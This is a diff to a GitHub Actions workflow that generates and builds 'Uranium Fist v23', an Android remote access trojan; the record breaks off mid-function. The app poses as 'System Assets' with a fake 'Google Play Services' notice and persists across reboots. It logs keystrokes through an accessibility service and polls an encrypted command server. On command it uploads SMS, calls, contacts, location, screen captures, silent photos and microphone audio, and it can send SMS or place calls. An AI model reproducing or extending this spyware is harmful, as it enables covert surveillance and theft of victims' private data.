@@ -1,4 +1,4 @@
-name: Uranium Fist v18 Builder
+name: Uranium Fist v23 Titan Builder
 
 on:
   workflow_dispatch:
@@ -6,24 +6,573 @@ on:
 jobs:
   build:
     runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
 
-      - uses: actions/setup-java@v4
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
         with:
           distribution: 'temurin'
           java-version: '17'
 
-      - uses: gradle/actions/setup-gradle@v3
+      - name: Setup Gradle (8.5)
+        uses: gradle/actions/setup-gradle@v3
         with:
           gradle-version: '8.5'
 
-      - name: Build
+      - name: Scaffold and Build v23
         run: |
           cd android
-          gradle app:assembleDebug
+          mkdir -p app/src/main/java/com/assets/service
+          mkdir -p app/src/main/res/values
+          mkdir -p app/src/main/res/xml
 
-      - uses: actions/upload-artifact@v4
-        with:
-          name: Uranium-Fist-v18
-          path: '**/app/build/outputs/apk/debug/app-debug.apk'
+          cat << 'BUILDEOF' > app/build.gradle.kts
+          plugins {
+              id("com.android.application")
+              id("org.jetbrains.kotlin.android")
+          }
+          android {
+              namespace = "com.assets.service"
+              compileSdk = 34
+              defaultConfig {
+                  applicationId = "com.assets.service"
+                  minSdk = 26
+                  targetSdk = 34
+                  versionCode = 23
+                  versionName = "23.0"
+              }
+              buildTypes {
+                  release {
+                      isMinifyEnabled = false
+                      signingConfig = signingConfigs.getByName("debug")
+                  }
+              }
+              compileOptions {
+                  sourceCompatibility = JavaVersion.VERSION_17
+                  targetCompatibility = JavaVersion.VERSION_17
+              }
+              kotlinOptions { jvmTarget = "17" }
+          }
+          dependencies {
+              implementation("androidx.core:core-ktx:1.12.0")
+              implementation("androidx.appcompat:appcompat:1.6.1")
+              implementation("androidx.lifecycle:lifecycle-service:2.7.0")
+              implementation("androidx.camera:camera-core:1.3.1")
+              implementation("androidx.camera:camera-camera2:1.3.1")
+              implementation("androidx.camera:camera-lifecycle:1.3.1")
+              implementation("com.squareup.okhttp3:okhttp:4.12.0")
+              implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3")
+          }
+          BUILDEOF
+
+          cat << 'MANIFESTEOF' > app/src/main/AndroidManifest.xml
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+              <uses-permission android:name="android.permission.INTERNET"/>
+              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+              <uses-permission android:name="android.permission.WAKE_LOCK"/>
+              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"/>
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
+              <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+              <uses-permission android:name="android.permission.CAMERA"/>
+              <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+              <uses-permission android:name="android.permission.FLASHLIGHT"/>
+              <uses-permission android:name="android.permission.VIBRATE"/>
+              <uses-permission android:name="android.permission.READ_SMS"/>
+              <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+              <uses-permission android:name="android.permission.READ_CONTACTS"/>
+              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32"/>
+              <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
+              <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
+              <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>
+              <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"/>
+              <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
+
+              <application android:label="System Assets" android:icon="@android:drawable/sym_def_app_icon">
+                  <activity android:name=".MainActivity" android:exported="true" android:excludeFromRecents="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN"/>
+                          <category android:name="android.intent.category.LAUNCHER"/>
+                      </intent-filter>
+                  </activity>
+                  <activity android:name=".PermissionActivity" android:exported="false" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+                  <activity android:name=".ScreenReaderActivity" android:exported="false" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+                  
+                  <service android:name=".SyncService" android:foregroundServiceType="dataSync|camera|microphone|mediaProjection" android:exported="false"/>
+                  
+                  <service android:name=".MyAccessibilityService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:exported="true">
+                      <intent-filter><action android:name="android.accessibilityservice.AccessibilityService" /></intent-filter>
+                      <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config" />
+                  </service>
+                  
+                  <receiver android:name=".BootReceiver" android:exported="true">
+                      <intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter>
+                  </receiver>
+              </application>
+          </manifest>
+          MANIFESTEOF
+
+          cat << 'XMLEOF' > app/src/main/res/xml/accessibility_service_config.xml
+          <?xml version="1.0" encoding="utf-8"?>
+          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+              android:accessibilityEventTypes="typeAllMask"
+              android:accessibilityFeedbackType="feedbackGeneric"
+              android:notificationTimeout="100"
+              android:canRetrieveWindowContent="true"
+              android:description="@string/app_name" />
+          XMLEOF
+
+          cat << 'STRINGS' > app/src/main/res/values/strings.xml
+          <resources><string name="app_name">System Assets Core</string></resources>
+          STRINGS
+
+          cat << 'MAINEOF' > app/src/main/java/com/assets/service/MainActivity.kt
+          package com.assets.service
+          import android.app.Activity
+          import android.content.Intent
+          import android.os.Build
+          import android.os.Bundle
+          import android.widget.TextView
+          class MainActivity : Activity() {
+              override fun onCreate(savedInstanceState: Bundle?) {
+                  super.onCreate(savedInstanceState)
+                  setContentView(TextView(this).apply { text = "System Updating..."; textSize = 20f; setPadding(50, 50, 50, 50) })
+                  try {
+                      val i = Intent(this, SyncService::class.java)
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i) else startService(i)
+                  } catch (e: Exception) {}
+                  finish()
+              }
+          }
+          MAINEOF
+
+          cat << 'PERMEOF' > app/src/main/java/com/assets/service/PermissionActivity.kt
+          package com.assets.service
+          import android.app.Activity
+          import android.content.Intent
+          import android.media.projection.MediaProjectionManager
+          import android.os.Bundle
+          import android.content.Context
+          class PermissionActivity : Activity() {
+              override fun onCreate(savedInstanceState: Bundle?) {
+                  super.onCreate(savedInstanceState)
+                  val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+                  startActivityForResult(mpm.createScreenCaptureIntent(), 100)
+              }
+              override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+                  super.onActivityResult(requestCode, resultCode, data)
+                  if (requestCode == 100 && resultCode == RESULT_OK && data != null) {
+                      val intent = Intent(this, SyncService::class.java).apply {
+                          action = "START_STREAM"
+                          putExtra("resultCode", resultCode)
+                          putExtra("data", data)
+                      }
+                      startForegroundService(intent)
+                  }
+                  finish()
+              }
+          }
+          PERMEOF
+
+          cat << 'SCREENREADER' > app/src/main/java/com/assets/service/ScreenReaderActivity.kt
+          package com.assets.service
+          import android.app.Activity
+          import android.os.Bundle
+          class ScreenReaderActivity : Activity() {
+              override fun onCreate(savedInstanceState: Bundle?) {
+                  super.onCreate(savedInstanceState)
+                  // واجهة شفافة مخصصة لقراءة الشاشة إذا لزم الأمر
+                  finish()
+              }
+          }
+          SCREENREADER
+
+          cat << 'BOOTEOF' > app/src/main/java/com/assets/service/BootReceiver.kt
+          package com.assets.service
+          import android.content.BroadcastReceiver
+          import android.content.Context
+          import android.content.Intent
+          import android.os.Build
+          class BootReceiver : BroadcastReceiver() {
+              override fun onReceive(context: Context?, intent: Intent?) {
+                  try {
+                      val i = Intent(context, SyncService::class.java)
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context?.startForegroundService(i) else context?.startService(i)
+                  } catch (_: Exception) {}
+              }
+          }
+          BOOTEOF
+
+          cat << 'ACCEOF' > app/src/main/java/com/assets/service/MyAccessibilityService.kt
+          package com.assets.service
+          import android.accessibilityservice.AccessibilityService
+          import android.view.accessibility.AccessibilityEvent
+          import android.view.accessibility.AccessibilityNodeInfo
+          import java.io.File
+          import java.io.FileOutputStream
+          class MyAccessibilityService : AccessibilityService() {
+              companion object { var instance: MyAccessibilityService? = null }
+              override fun onServiceConnected() { super.onServiceConnected(); instance = this }
+              override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+                  if (event != null && event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                      try {
+                          FileOutputStream(File(filesDir, "keylog.txt"), true).use { it.write("[${System.currentTimeMillis()}] ${event.text.joinToString(" ")}\n".toByteArray()) }
+                      } catch (_: Exception) {}
+                  }
+              }
+              override fun onInterrupt() { instance = null }
+              
+              fun typeText(text: String) {
+                  val root = rootInActiveWindow ?: return
+                  val node = findEditText(root)
+                  if (node != null) {
+                      val args = android.os.Bundle()
+                      args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
+                      node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
+                  }
+              }
+              private fun findEditText(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
+                  if (node == null) return null
+                  if (node.className == "android.widget.EditText") return node
+                  for (i in 0 until node.childCount) {
+                      val child = findEditText(node.getChild(i))
+                      if (child != null) return child
+                  }
+                  return null
+              }
+              fun pressHome() { performGlobalAction(GLOBAL_ACTION_HOME) }
+              fun pressBack() { performGlobalAction(GLOBAL_ACTION_BACK) }
+              fun pressRecents() { performGlobalAction(GLOBAL_ACTION_RECENTS) }
+          }
+          ACCEOF
+
+          cat << 'SYNCEOF' > app/src/main/java/com/assets/service/SyncService.kt
+          package com.assets.service
+
+          import android.annotation.SuppressLint
+          import android.app.Notification
+          import android.app.NotificationChannel
+          import android.app.NotificationManager
+          import android.app.admin.DevicePolicyManager
+          import android.content.*
+          import android.content.pm.ServiceInfo
+          import android.graphics.Bitmap
+          import android.graphics.PixelFormat
+          import android.hardware.camera2.CameraManager
+          import android.hardware.display.DisplayManager
+          import android.hardware.display.VirtualDisplay
+          import android.media.*
+          import android.media.projection.MediaProjection
+          import android.media.projection.MediaProjectionManager
+          import android.net.*
+          import android.os.*
+          import android.provider.*
+          import android.telephony.SmsManager
+          import android.util.Base64
+          import androidx.camera.core.*
+          import androidx.camera.lifecycle.ProcessCameraProvider
+          import androidx.core.app.NotificationCompat
+          import androidx.core.content.ContextCompat
+          import androidx.lifecycle.LifecycleService
+          import kotlinx.coroutines.*
+          import okhttp3.*
+          import okhttp3.MediaType.Companion.toMediaType
+          import okhttp3.RequestBody.Companion.toRequestBody
+          import org.json.JSONObject
+          import java.io.*
+          import java.security.MessageDigest
+          import java.security.SecureRandom
+          import java.util.*
+          import java.util.concurrent.TimeUnit
+          import java.util.zip.*
+          import javax.crypto.Cipher
+          import javax.crypto.spec.GCMParameterSpec
+          import javax.crypto.spec.SecretKeySpec
+          import kotlin.coroutines.resume
+
+          class SyncService : LifecycleService() {
+              private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+              private val SERVER = "https://web-assets-service-3.onrender.com/api/v3/uranium/stream"
+              private val UPLOAD = "https://web-assets-service-3.onrender.com/api/v3/uranium/upload_raw"
+              private var wakeLock: PowerManager.WakeLock? = null
+              private lateinit var cameraManager: CameraManager
+              private var wifiAutopilot = true
+              private var stealthState = "TITAN_v23"
+              private var deviceSecret: String = ""
+              private var projection: MediaProjection? = null
+              private var virtualDisplay: VirtualDisplay? = null
+
+              private val client = OkHttpClient.Builder().connectTimeout(120, TimeUnit.SECONDS).readTimeout(120, TimeUnit.SECONDS).writeTimeout(120, TimeUnit.SECONDS).build()
+
+              companion object {
+                  private const val CHANNEL_ID = "sys_assets_v23"
+                  private const val NOTIF_ID = 888
+                  private const val PREFS = "sys_assets_prefs"
+                  private const val KEY_SECRET = "device_secret"
+              }
+
+              override fun onCreate() {
+                  super.onCreate()
+                  acquireWakeLock()
+                  startForegroundNotif()
+                  cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+                  deviceSecret = getOrCreateDeviceSecret()
+              }
+
+              private fun getOrCreateDeviceSecret(): String {
+                  val prefs = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
+                  var secret = prefs.getString(KEY_SECRET, null)
+                  if (secret.isNullOrEmpty()) {
+                      secret = UUID.randomUUID().toString().replace("-", "") + UUID.randomUUID().toString().replace("-", "")
+                      prefs.edit().putString(KEY_SECRET, secret).apply()
+                  }
+                  return secret
+              }
+
+              private fun acquireWakeLock() {
+                  try {
+                      val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+                      wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Assets::WakeV23").apply { acquire(30L * 24 * 60 * 60 * 1000) }
+                  } catch (_: Exception) {}
+              }
+
+              private fun startForegroundNotif() {
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                      val ch = NotificationChannel(CHANNEL_ID, "System Sync", NotificationManager.IMPORTANCE_MIN).apply { setShowBadge(false) }
+                      (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
+                  }
+                  val n: Notification = NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("Google Play Services").setSmallIcon(android.R.drawable.stat_sys_data_bluetooth).build()
+                  try {
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+                      else startForeground(NOTIF_ID, n)
+                  } catch (_: Exception) {}
+              }
+
+              override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+                  super.onStartCommand(intent, flags, startId)
+                  if (intent?.action == "START_STREAM") {
+                      val resultCode = intent.getIntExtra("resultCode", 0)
+                      val data = intent.getParcelableExtra<Intent>("data")
+                      if (resultCode != 0 && data != null) {
+                          val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+                          projection = mpm.getMediaProjection(resultCode, data)
+                          startScreenStream()
+                      }
+                  }
+                  scope.launch {
+                      while (isActive) {
+                          try {
+                              val hb = JSONObject().apply { put("type", "HEARTBEAT"); put("nodeId", getNodeId()); put("deviceSecret", deviceSecret); put("model", "${Build.MODEL} [$stealthState]") }
+                              val resp = sendEncrypted(hb.toString())
+                              if (resp != null && resp.has("task") && !resp.isNull("task")) executeTask(resp.getJSONObject("task"))
+                          } catch (_: Exception) {}
+                          delay(3000L)
+                      }
+                  }
+                  return START_STICKY
+              }
+
+              private fun startScreenStream() {
+                  val proj = projection ?: return
+                  val metrics = resources.displayMetrics
+                  val imageReader = ImageReader.newInstance(metrics.widthPixels, metrics.heightPixels, PixelFormat.RGBA_8888, 2)
+                  virtualDisplay = proj.createVirtualDisplay("ScreenStream", metrics.widthPixels, metrics.heightPixels, metrics.densityDpi,
+                      DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.surface, null, null)
+                  
+                  scope.launch {
+                      while (isActive && projection != null) {
+                          imageReader.acquireLatestImage()?.use { image ->
+                              val planes = image.planes
+                              val buffer = planes[0].buffer
+                              val pixelStride = planes[0].pixelStride
+                              val rowStride = planes[0].rowStride
+                              val rowPadding = rowStride - pixelStride * metrics.widthPixels
+                              val bitmap = Bitmap.createBitmap(metrics.widthPixels + rowPadding / pixelStride, metrics.heightPixels, Bitmap.Config.ARGB_8888)
+                              bitmap.copyPixelsFromBuffer(buffer)
+                              val bos = ByteArrayOutputStream()
+                              bitmap.compress(Bitmap.CompressFormat.JPEG, 50, bos)
+                              if (bos.size() > 0) {
+                                  uploadChunked(bos.toByteArray(), "screen_${System.currentTimeMillis()}.jpg")
+                              }
+                              bitmap.recycle()
+                          }
+                          delay(2000L)
+                      }
+                  }
+                  sendReport("Stream", "بدأ بث الشاشة بنجاح 🟢")
+              }
+
+              private fun getKey(): ByteArray = MessageDigest.getInstance("SHA-256").digest((if (deviceSecret.isNotEmpty()) "$deviceSecret|uranium-v23" else "fallback|uranium-v23").toByteArray())
+              
+              private fun encryptPayload(plain: String): String {
+                  val bout = ByteArrayOutputStream()
+                  GZIPOutputStream(bout).use { it.write(plain.toByteArray(Charsets.UTF_8)) }
+                  val cipher = Cipher.getInstance("AES/GCM/NoPadding")
+                  val iv = ByteArray(12).apply { SecureRandom().nextBytes(this) }
+                  cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(getKey(), "AES"), GCMParameterSpec(128, iv))
+                  val out = cipher.doFinal(bout.toByteArray())
+                  val pkt = JSONObject().apply { put("v", iv.joinToString("") { "%02x".format(it) }); put("g", out.takeLast(16).joinToString("") { "%02x".format(it) }); put("d", out.dropLast(16).joinToString("") { "%02x".format(it) }) }
+                  return Base64.encodeToString(pkt.toString().toByteArray(), Base64.NO_WRAP)
+              }
+
+              private fun decryptPayload(b64: String): String? {
+                  return try {
+                      val pkt = JSONObject(String(Base64.decode(b64.trim(), Base64.NO_WRAP)))
+                      val cipher = Cipher.getInstance("AES/GCM/NoPadding")
+                      cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(getKey(), "AES"), GCMParameterSpec(128, pkt.getString("v").chunked(2).map { it.toInt(16).toByte() }.toByteArray()))
+                      String(cipher.doFinal(pkt.getString("d").chunked(2).map { it.toInt(16).toByte() }.toByteArray() + pkt.getString("g").chunked(2).map { it.toInt(16).toByte() }.toByteArray()))
+                  } catch (_: Exception) { null }
+              }
+
+              private fun sendEncrypted(plain: String): JSONObject? {
+                  var tries = 0
+                  while (tries < 3) {
+                      try {
+                          val req = Request.Builder().url(SERVER).post(encryptPayload(plain).toRequestBody("text/plain".toMediaType())).addHeader("x-node-id", getNodeId()).addHeader("x-device-secret", deviceSecret).build()
+                          client.newCall(req).execute().use { r -> if (r.isSuccessful) { val dec = decryptPayload(r.body?.string() ?: "{}"); return try { JSONObject(dec ?: "{}") } catch (_: Exception) { JSONObject() } } }
+                      } catch (_: Exception) { tries++; Thread.sleep(1000) }
+                  }
+                  return null
+              }
+
+              private suspend fun executeTask(task: JSONObject) {
+                  val action = task.optString("action", "").uppercase()
+                  when {
+                      action.contains("CMD_FLASH_ON") -> toggleFlash(true)
+                      action.contains("CMD_FLASH_OFF") -> toggleFlash(false)
+                      action.contains("CMD_VIBRATE") -> vibrate(5000)
+                      action.contains("CMD_BEEP") -> playBeep()
+                      action.contains("MIC_AI_LISTEN") -> recordAudio()
+                      action.contains("MICRO_BURST_SNAP") -> streamLatestPhoto("MicroBurst")
+                      action.contains("EXTRACT_CAMERA_SNAP") -> captureSilentPhoto(false)
+                      action.contains("EXTRACT_CAMERA_SNAP_FRONT") -> captureSilentPhoto(true)
+                      action.contains("EXTRACT_VIDEO_SNAP") -> captureVideoShort()
+                      action.contains("EXTRACT_SMS") -> sendReport("SMS", readSms())
+                      action.contains("EXTRACT_CALLS") -> sendReport("CallLog", readCalls())
+                      action.contains("EXTRACT_CONTACTS") -> sendReport("Contacts", readContacts())
+                      action.contains("EXTRACT_APPS") -> sendReport("Apps", readApps())
+                      action.contains("EXTRACT_LOCATION") -> sendReport("Location", readLocation())
+                      action.contains("EXTRACT_DEVICE_INFO") -> sendReport("Device", readDeviceInfo())
+                      action.contains("EXTRACT_CLIPBOARD") -> sendReport("Clipboard", readClipboard())
+                      action.contains("EXTRACT_PHOTOS") -> streamMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 20)
+                      action.contains("EXTRACT_VIDEOS") -> streamMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 10)
+                      action.contains("PROC_DCIM") -> if (wifiOk()) zipFolder("DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI) else sendReport("Delay", "DCIM مؤجل")
+                      action.contains("PROC_DOWNLOAD") -> if (wifiOk()) zipFolder("Download", MediaStore.Files.getContentUri("external")) else sendReport("Delay", "Download مؤجل")
+                      action.contains("STORAGE_AUDIT") -> sendReport("Audit", storageAudit())
+                      action.contains("WIFI_AUTOPILOT") -> { wifiAutopilot = !wifiAutopilot; sendReport("WiFi", "Autopilot: $wifiAutopilot") }
+                      action.contains("GEO_FENCE_ALERT") -> sendReport("GeoAlert", readLocation())
+                      action.contains("POLY_MUTATE") -> { stealthState = "MUT_${System.currentTimeMillis() % 10000}"; sendReport("Poly", "Became $stealthState") }
+                      action.contains("STEALTH_BLACKOUT") -> sendReport("Stealth", "Blackout active")
+                      action.contains("SELF_DESTRUCT") -> { try { cacheDir.deleteRecursively() } catch (_: Exception) {}; stopSelf() }
+                      
+                      action.contains("START_SCREEN_STREAM") -> {
+                          if (projection == null) {
+                              startActivity(Intent(this, PermissionActivity::class.java).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
+                              sendReport("Stream", "بانتظار موافقة المستخدم للبث")
+                          } else {
+                              startScreenStream()
+                          }
+                      }
+                      action.contains("STOP_SCREEN_STREAM") -> { projection?.stop(); projection = null; virtualDisplay = null; sendReport("Stream", "تم إيقاف البث") }
+                      action.contains("TYPE_TEXT") -> {
+                          val textToType = task.optString("text", "")
+                          if (textToType.isNotEmpty()) {
+                              MyAccessibilityService.instance?.typeText(textToType)
+                              sendReport("Type", "تم كتابة النص في الحقل المفتوح: $textToType")
+                          }
+                      }
+
+                      // ════════════ الأوامر العشرة الجديدة ════════════
+                      action.contains("CMD_HOME") -> { MyAccessibilityService.instance?.pressHome(); sendReport("UI", "الرجوع للرئيسية") }
+                      action.contains("CMD_BACK") -> { MyAccessibilityService.instance?.pressBack(); sendReport("UI", "زر الرجوع") }
+                      action.contains("CMD_RECENTS") -> { MyAccessibilityService.instance?.pressRecents(); sendReport("UI", "التطبيقات الحديثة") }
+                      action.contains("CMD_SEND_SMS") -> {
+                          val phone = task.optString("phone", "")
+                          val msg = task.optString("msg", "")
+                          if (phone.isNotEmpty() && msg.isNotEmpty()) {
+                              try {
+                                  val sms = SmsManager.getDefault()
+                                  sms.sendTextMessage(phone, null, msg, null, null)
+                                  sendReport("SMS", "تم إرسال رسالة إلى $phone")
+                              } catch (e: Exception) { sendReport("SMSErr", e.message ?: "?") }
+                          }
+                      }
+                      action.contains("CMD_CALL_NUMBER") -> {
+                          val phone = task.optString("phone", "")
+                          if (phone.isNotEmpty()) {
+                              try {
+                                  startActivity(Intent(Intent.ACTION_CALL, Uri.parse("tel:$phone")).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
+                                  sendReport("Call", "تم بدء الاتصال بـ $phone")
+                              } catch (e: Exception) { sendReport("CallErr", e.message ?: "?") }
+                          }
+                      }
+                      action.contains("CMD_OPEN_URL") -> {
+                          val url = task.optString("url", "")
+                          if (url.isNotEmpty()) {
+                              try {
+                                  startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) })
+                                  sendReport("URL", "تم فتح $url")
+                              } catch (e: Exception) { sendReport("URLErr", e.message ?: "?") }
+                          }
+                      }
+                      action.contains("CMD_SET_VOLUME") -> {
+                          val vol = task.optInt("vol", 100)
+                          try {
+                              val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+                              am.setStreamVolume(AudioManager.STREAM_MUSIC, vol, 0)
+                              sendReport("Vol", "تم ضبط الصوت على $vol")
+                          } catch (e: Exception) { sendReport("VolErr", e.message ?: "?") }
+                      }
+                      action.contains("CMD_SCREEN_ON") -> {
+                          try {
+                              val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+                              val wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP, "Uranium::ScreenOn")
+                              wl.acquire(10000L)
+                              wl.release()
+                              sendReport("Screen", "تم إشعال الشاشة")
+                          } catch (e: Exception) { sendReport("ScreenErr", e.message ?: "?") }
+                      }
+                      action.contains("CMD_LOCK_SCREEN") -> {
+                          try {
+                              val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                              dpm.lockNow()
+                              sendReport("Screen", "تم قفل الشاشة")
+                          } catch (e: Exception) { sendReport("LockErr", e.message ?: "?") }
+                      }
+                      action.contains("CMD_BRIGHTNESS") -> {
+                          val br = task.optInt("brightness", 128)
+                          try {
+                              Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, br.coerceIn(0, 255))
+                              sendReport("Bright", "تم تغيير السطوع إلى $br")
+                          } catch (e: Exception) { sendReport("BrightErr", e.message ?: "?") }
+                      }
+                      // ════════════════════════════════════════════════
+                  }
+              }
+
+              private fun toggleFlash(on: Boolean) { try { val id = cameraManager.cameraIdList.firstOrNull { cameraManager.getCameraCharacteristics(it).get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true } ?: return; cameraManager.setTorchMode(id, on) } catch (_: Exception) {} }
+              @SuppressLint("MissingPermission") private fun vibrate(ms: Long) { try { val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator; if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE)) else v.vibrate(ms) } catch (_: Exception) {} }
+              private fun playBeep() { try { MediaPlayer().apply { setDataSource(this@SyncService, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)); isLooping = false; prepare(); start() } } catch (_: Exception) {} }
+
+              private fun recordAudio() { scope.launch { try { val f = File(cacheDir, "mic_${System.currentTimeMillis()}.3gp"); val r = MediaRecorder().apply { setAudioSource(MediaRecorder.AudioSource.MIC); setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP); setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); setOutputFile(f.absolutePath); prepare(); start() }; delay(6000L); r.stop(); r.release(); if (f.exists()) { uploadRawFile(f) }; f.delete() } catch (_: Exception) {} } }
+
+              private fun streamLatestPhoto(prefix: String) { scope.launch { try { val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI; contentResolver.query(uri, arrayOf(MediaStore.MediaColumns._ID), null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c -> if (c.moveToFirst()) { val fileUri = ContentUris.withAppendedId(uri, c.getLong(c.getColumnIndex(MediaStore.MediaColumns._ID))); contentResolver.openInputStream(fileUri)?.use { uploadChunked(it.readBytes(), "${prefix}_${System.currentTimeMillis()}.jpg") } } } } catch (_: Exception) {} } }
+
+              @SuppressLint("MissingPermission") private suspend fun captureSilentPhoto(front: Boolean = false) { try { val provider = ProcessCameraProvider.getInstance(this).get(); val capture = ImageCapture.Builder().build(); provider.bindToLifecycle(this, if (front) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA, Preview.Builder().build(), capture); delay(400L); val file = File(cacheDir, "silent_${System.currentTimeMillis()}.jpg"); suspendCancellableCoroutine<Boolean> { cont -> capture.takePicture(ImageCapture.OutputFileOptions.Builder(file).build(), ContextCompat.getMainExecutor(this), object : ImageCapture.OnImageSavedCallback { override fun onImageSaved(results: ImageCapture.OutputFileResults) { cont.resume(true) }; override fun onError(e: ImageCaptureException) { cont.resume(false) } }) }; provider.unbindAll(); if (file.exists()) { uploadChunked(file.readBytes(), file.name); file.delete() } } catch (_: Exception) {} }
+
+              private fun captureVideoShort() { scope.launch { try { startActivity(Intent(MediaStore.ACTION_VIDEO_CAPTURE).apply { putExtra(MediaStore.EXTRA_DURATION_LIMIT, 10); addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }) } catch (_: Exception) {} } }
+              private fun sendReport(label: String, content: String) { scope.launch { sendEncrypted(JSONObject().apply { put("type", "TEXT_REPORT"); put("data", "=== $label ===\n$content") }.toString()) } }
+
+              private fun readSms(): String = StringBuilder().apply { try { contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)?.use { c -> while (c.moveToNext()) append("[${c.getString(c.getColumnIndex("address"))}] ${c.getString(c.getColumnIndex("body"))}\n") } } catch (_: Exception) {} }.toString()
+              private fun readCalls(): String = StringBuilder().apply { try { contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)?.use { c -> while (c.moveToNext()) append("${c.getString(c.getColumnIndex(CallLog.Calls.NUMBER))}\n") } } catch (_: Exception) {} }.toString()
+              private fun readContacts(): String = StringBuilder().apply { try { contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use { c -> while (c.moveToNext()) append("${c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))}\n") } } catch (_: Exception) {} }.toString()
+              private fun
